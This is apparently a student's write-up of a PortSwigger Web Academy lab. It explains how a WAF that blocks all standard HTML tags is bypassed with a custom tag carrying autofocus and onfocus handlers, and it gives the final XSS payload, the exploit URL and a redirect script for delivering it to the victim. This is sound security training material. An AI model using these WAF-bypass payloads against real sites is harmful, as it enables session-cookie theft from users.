# Lab 04 — Reflected XSS into HTML Context with All Tags Blocked Except Custom Ones

**Level:** Practitioner
**Type:** Reflected XSS + Custom Tag Injection
**Status:** ✅ Solved
**Platform:** PortSwigger Web Academy

---

## 🎯 Objective
Bypass WAF that blocks ALL standard HTML tags.
Inject a custom HTML tag that automatically alerts `document.cookie`
with zero user interaction.

---

## 🧠 Concept
WAF blocks all known HTML tags like `<script>`, `<img>`, `<body>`.
But it cannot block **custom tags** because they are unlimited —
you can invent any tag name like `<xss>`, `<hack>`, `<customtag>`.
Custom tags support event handlers just like standard HTML tags.

---

## 🪜 Steps to Reproduce

### Step 1 — Confirm Standard Tags Are Blocked
<script>alert(1)</script>  → 400 Blocked
<img src=1 onerror=alert(1)>  → 400 Blocked

### Step 2 — Try a Custom Tag
<xss>  → 200 OK ✅ (not blocked!)

WAF has no rule for unknown/custom tags.

### Step 3 — Add autofocus + onfocus for Auto Execution
```html
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
```
- `autofocus` → browser auto-focuses this element on page load
- `tabindex=1` → makes element focusable
- `onfocus` → fires when element receives focus
- Triggers automatically — no user interaction needed ✅

### Step 4 — Build Full Exploit URL
https://YOUR-LAB-ID.web-security-academy.net/
?search=<xss+autofocus+tabindex=1+onfocus=alert(document.cookie)></xss>

### Step 5 — Deliver via Exploit Server
```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/
?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>';
</script>
```
1. Go to Exploit Server
2. Paste script in body
3. Click Deliver to Victim
4. Lab solved ✅

---

## 💉 Final Payload
```html
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
```

---

## 🔍 Why It Works

| Part | Reason |
|------|--------|
| `<xss>` custom tag | WAF only blocks known tags — custom tags pass through |
| `autofocus` | Browser focuses element automatically on page load |
| `tabindex=1` | Makes element focusable (required for onfocus to work) |
| `onfocus` | Fires automatically when element is focused |
| `document.cookie` | Proves real impact — steals session cookie |

---

## ⚡ Lab 03 vs Lab 04 — Key Difference

| | Lab 03 | Lab 04 |
|---|--------|--------|
| WAF blocks | Most tags | ALL standard tags |
| Bypass method | Allowed tag + event fuzzing | Custom invented tag |
| Auto-execute | iframe onload resize trick | autofocus + onfocus |
| Payload delivery | iframe | location redirect |

---

## 💡 Key Takeaway
WAF blacklists only work for KNOWN tags.
Custom tags are unlimited — attacker can invent any name.
`autofocus` + `onfocus` is a powerful combo for
triggering XSS with zero user interaction.
Always try custom tags when all standard tags are blocked.

---

## 🛠️ Tools Used
- Browser URL manipulation
- Exploit Server (payload delivery)

---

## 🔗 References
- https://portswigger.net/web-security/cross-site-scripting/contexts
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet